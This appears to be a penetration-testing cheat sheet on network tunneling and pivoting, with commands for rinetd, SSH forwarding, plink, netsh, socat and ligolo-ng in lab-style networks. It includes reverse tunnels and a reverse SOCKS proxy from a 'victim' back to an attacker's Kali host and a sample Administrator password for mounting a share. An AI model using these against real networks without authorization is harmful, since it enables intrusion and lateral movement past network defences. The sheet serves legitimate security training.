# Tunnels

---

## rinetd

# Example rinetd.conf for port forwarding

cat /etc/rinetd.conf
0.0.0.0 80 8.8.8.8 80

# Restart rinetd to apply changes

sudo systemctl restart rinetd

---

## SSH Tunneling

### Local Port Forward

# Forward local port 445 to remote 172.16.134.5:445 via 192.168.134.44

ssh root@192.168.134.44 -L 0.0.0.0:445:172.16.134.5:445 -N

### Remote Port Forward

# Open port 445 on remote host to local 127.0.0.1:445

```bash
ssh root@192.168.134.44 -R 445:127.0.0.1:445 -N
```

### Dynamic Port Forwarding (SOCKS Proxy)

```bash
ssh root@192.168.134.44 -D 1080 -N
```

`

# Add SOCKS proxy to proxychains config

```bash
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
`
# Use proxychains with any tool

proxychains <tool>
proxychains nmap -sT 127.0.0.1 -Pn
```

- Remember 127.0.0.1 is the local for the ssh target (aka the pivot)

### Secure unattended

- On reverse port forward machine

```bash
ssh-keygen -f /tmp/id_rsa -N ""
cat /tmp/id_rsa.pub
```

- Store the pub key in out authorized with some flags

```bash
tail -n 1 ~/.ssh/authorized_keys

**from="10.11.1.250",command="echo 'This account can only be used for port forwarding'"
,no-agent-forwarding,no-X11-forwarding,no-pty <key>**'
# The red limit access, from ip, commands=not allowed.s
```

```bash
ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 \
      -o "UserKnownHostsFile=/dev/null" \
      -o "StrictHostKeyChecking=no" kali@10.11.0.4 -i /tmp/id_rsa
```

### Reverse dynamic port forward / tunnel

- By only specifying the one -R port in new ssh versions we get a reverse socks
  proxy

```bash
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" \
      -o "StrictHostKeyChecking=no" \
      -i /var/lib/mysql/.ssh/id_rsa kali@10.11.0.4
```

---

## plink.exe

- Download the
  latest [Download PuTTY: latest release (0.78)](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
- SSH into attacker and forward 3306 to 1234 on attacker
- Victim

```bash
plink.exe -ssh kallie@192.168.119.134  -R 1234:127.0.0.1:3306
```

- Attacker

```bash
nmap -sS -sV -p 1234 127.0.0.1
```

---

## netsh

- Local port to remote port

```bash
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 \
    connectport=445 connectaddress=192.168.1.110
```

- Add firewall rule if needed

```bash
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP \
    dir=in localip=10.11.0.22 localport=4455 action=allow

smbclient -L 10.11.0.22 --port=4455 --user=Administrator

sudo mkdir /mnt/win10_share
sudo mount -t cifs -o port=4455 //10.11.0.22/Data \
  -o username=Administrator,password=Qwerty09! /mnt/win10_share
```

## Socat

```bash
# TCP forward example
```

socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321

---

## UDP Forwards

- [Performing UDP tunneling through an SSH connection](http://zarb.org/~gc/html/udp-in-ssh-tunneling.html)

## ligolo-ng

### Add the ligolo device

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip link set ligolo down
```

### Start Proxy

```bash
./proxy -selfcert -laddr 0.0.0.0:53
./proxy -autocert -laddr 0.0.0.0:53
```

### Start Agent

```bash
./agent -connect x.x.x.x:53 -ignore-cert
./agent -connect x.x.x.x:54
```

### Add a route

#### On the server (Linux)

```bash
sudo ip route add <target_subnet>/24 dev ligolo  
sudo ip route add 192.168.110.0/24 dev ligolo  

```

netsh int ipv4 show interfaces
route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if <lingolo iface id>

